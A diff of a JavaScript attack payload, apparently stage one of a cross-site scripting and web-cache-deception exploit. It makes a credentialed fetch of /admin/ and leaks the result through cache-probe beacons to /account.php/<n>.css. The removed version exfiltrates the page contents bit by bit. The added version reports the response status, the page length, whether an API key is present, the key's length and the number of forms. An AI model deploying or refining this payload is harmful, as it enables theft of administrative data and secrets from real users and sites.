@@ -1,23 +1,16 @@
-/* stage 1: read /admin/ and exfiltrate it through the edge cache, bit by bit.
-   channel: GET /account.php/B<index>.css  -> cached (HIT) means bit = 1        */
 (function () {
-  var MARK = 'S1';
-  function beacon(n) { new Image().src = '/account.php/' + n + '.css'; }
-  beacon(MARK + '_alive');
+  function b(n) { new Image().src = '/account.php/' + n + '.css'; }
+  b('S1_alive');
   fetch('/admin/', { credentials: 'include' })
-    .then(function (r) { return r.text(); })
+    .then(function (r) { b('S1_status_' + r.status); return r.text(); })
     .then(function (t) {
-      // compress: keep only what matters — strip tags to text + all attribute values
-      var keep = t.replace(/\s+/g, ' ');
-      var b = [];
-      for (var i = 0; i < keep.length && i < 1400; i++) b.push(keep.charCodeAt(i) & 0xff);
-      beacon(MARK + '_len_' + b.length);
-      for (var i = 0; i < b.length; i++) {
-        for (var j = 0; j < 8; j++) {
-          if (b[i] & (1 << j)) beacon(MARK + '_b_' + i + '_' + j);
-        }
-      }
-      beacon(MARK + '_done');
+      b('S1_len_' + t.length);
+      b('S1_haskey_' + (/api_key/i.test(t) ? 1 : 0));
+      b('S1_hasform_' + (/<form/i.test(t) ? 1 : 0));
+      var m = t.match(/api_key=([A-Za-z0-9_\-]+)/i);
+      b('S1_keylen_' + (m ? m[1].length : 0));
+      var f = t.match(/action="([^"]*)"/gi) || [];
+      b('S1_forms_' + f.length);
     })
-    .catch(function (e) { beacon(MARK + '_err'); });
+    .catch(function () { b('S1_fetcherr'); });
 })();
